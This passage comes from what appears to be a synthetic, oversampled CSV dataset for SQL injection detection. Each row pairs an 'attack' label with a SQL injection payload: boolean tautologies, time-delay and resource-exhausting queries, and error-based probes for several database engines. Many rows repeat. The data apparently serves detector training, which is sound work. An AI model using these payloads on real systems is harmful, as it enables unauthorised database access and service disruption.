SMOTE_000361,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000004,4.150145175145221
SMOTE_000362,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000043,1.7574126510363433
SMOTE_000363,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,1.556660496330044
SMOTE_000364,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,0.48315895114403173
SMOTE_000365,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,1.2434662801046075
SMOTE_000366,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000027,0.6522190332508857
SMOTE_000367,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000065,1.6751396171890054
SMOTE_000368,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,0.5494769359302631
SMOTE_000369,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000013,1.2771345363008677
SMOTE_000370,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000065,1.57404455506815
SMOTE_000371,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000035,0.6661154222053091
SMOTE_000372,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,0.27529161539512026
SMOTE_000373,attack,boolean,"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000070,0.9773356326965702
SMOTE_000374,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000027,0.35662022922480996
SMOTE_000375,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000003,0.14931647768588488
SMOTE_000376,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000013,2.2028445697838532
SMOTE_000377,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000001,3.6272673615454303
SMOTE_000378,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,0.1713177723591155
SMOTE_000379,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000043,1.4650299249996377
SMOTE_000380,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000052,1.3888081226722688
SMOTE_000381,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000003,0.9427421745789876
SMOTE_000382,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,1.8730127256037765
SMOTE_000383,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000053,1.865067714543257
SMOTE_000384,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,1.366962764113214
SMOTE_000385,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000050,0.1750470151162793
SMOTE_000386,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000063,1.0472165842655043
SMOTE_000387,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000022,1.6129108261358285
SMOTE_000388,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000008,2.163008149478504
SMOTE_000389,attack,boolean,"-4462%""  )   or 8571  =  8571--",nearest_attack_euclidean,R000041,1.77272571603835
SMOTE_000390,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000028,2.3092126147796845
SMOTE_000391,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,1.3414163659265887
SMOTE_000392,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000014,0.5353868412900711
SMOTE_000393,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000060,0.8589260414579791
SMOTE_000394,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000076,2.387305183578869
SMOTE_000395,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,0.6218293156439592
SMOTE_000396,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,2.069135451259376
SMOTE_000397,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,0.296294926920484
SMOTE_000398,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000047,0.9513747824150178
SMOTE_000399,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,1.4960500698931043
SMOTE_000400,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000048,0.19006985021693257
SMOTE_000401,attack,boolean,"-8919"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""nstr""  =  ""nstr",nearest_attack_euclidean,R000075,3.2772093766702106
SMOTE_000402,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000036,1.8936236798433652
SMOTE_000403,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000063,0.3685144725096071
SMOTE_000404,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,0.5313392541013748
SMOTE_000405,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,0.9608746560824917
SMOTE_000406,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,1.4328393351643118
SMOTE_000407,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000051,1.1779645786315394
SMOTE_000408,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000044,0.7361722175763303
SMOTE_000409,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000015,0.23872663163812305
SMOTE_000410,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000029,0.43263163263223114
SMOTE_000411,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000001,0.8261347155079083
SMOTE_000412,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,0.05611447775264074
SMOTE_000413,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000055,1.9287319398117349
SMOTE_000414,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,0.09856686310968897
SMOTE_000415,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000019,0.7571990699722361
SMOTE_000416,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,0.08879263694050173
SMOTE_000417,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,1.4095591721160117
SMOTE_000418,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000005,0.6169497017457871
SMOTE_000419,attack,boolean,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R000023,0.9576826062683153
SMOTE_000420,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000076,1.987803376603788
SMOTE_000421,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000064,1.6897505700173758
SMOTE_000422,attack,boolean,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kkim""  =  ""kkim",nearest_attack_euclidean,R000045,0.171544100532319
SMOTE_000423,attack,boolean,"-4462%""  )   or 8571  =  8571--",nearest_attack_euclidean,R000041,1.194449467894755
SMOTE_000424,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,1.0370009790451047
SMOTE_000425,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,1.0869772764221475
SMOTE_000426,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,0.2420961619634635
SMOTE_000427,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000044,1.9110414582990043
SMOTE_000428,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000011,0.9883580966880086
SMOTE_000429,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,0.5224373904519394
SMOTE_000430,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000017,0.2424220004893565
SMOTE_000431,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,1.3683698181796382
SMOTE_000432,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,1.3620127038422662
SMOTE_000433,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000013,0.09591450853688799
SMOTE_000434,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,0.8230803029726111
SMOTE_000435,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000043,1.4191381932557372
SMOTE_000436,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000025,1.144472090909343
SMOTE_000437,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,0.3527866313682758
SMOTE_000438,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,0.04609202300835411
SMOTE_000439,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000065,0.5691261000984791
SMOTE_000440,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000008,0.02784285941138993
SMOTE_000441,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000015,2.345476853365636
SMOTE_000442,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000008,0.30204485044022394
SMOTE_000443,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,0.6397749431929992
SMOTE_000444,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000015,0.37329491183015573
SMOTE_000445,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000047,1.0677608197265662
SMOTE_000446,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000060,0.4990058310994699
SMOTE_000447,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000037,1.0135319468138682
SMOTE_000448,attack,boolean,"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000009,0.7376324550605741
SMOTE_000449,attack,boolean,"-8919"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""nstr""  =  ""nstr",nearest_attack_euclidean,R000075,3.3335862471805964
SMOTE_000450,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000066,0.5021201505819649
SMOTE_000451,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000064,1.7000125769146341
SMOTE_000452,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000060,2.0248708190491436
SMOTE_000453,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,0.5417349730523529
SMOTE_000454,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000013,0.38159435304458816
SMOTE_000455,attack,boolean,-1989%'   )    )    or 6179  =  8518#,nearest_attack_euclidean,R000067,0.9083495299026606
SMOTE_000456,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000019,1.324703962072055
SMOTE_000457,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,0.6091476053381746
SMOTE_000458,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000068,2.387205651898251
SMOTE_000459,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,0.7485558612563159
SMOTE_000460,attack,boolean,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'rhzy'  =  'rhzy",nearest_attack_euclidean,R000006,0.6405891802173689
SMOTE_000461,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000058,1.4998405454224204
SMOTE_000462,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000004,1.0915351522824885
SMOTE_000463,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000046,0.1471723328618661
SMOTE_000464,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000013,1.827471598681961
SMOTE_000465,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000008,3.3083801394081758
SMOTE_000466,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,1.862343316449965
SMOTE_000467,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000061,0.7701707026784673
SMOTE_000468,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000068,1.5839384744515537
SMOTE_000469,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000058,0.12785347154345383
SMOTE_000470,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000065,0.5842101362434445
SMOTE_000471,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,1.7868063518774207
SMOTE_000472,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,1.8917666430923448
SMOTE_000473,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,0.45181123321577765
SMOTE_000474,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,0.6593789073008445
SMOTE_000475,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000058,1.5632816660448419
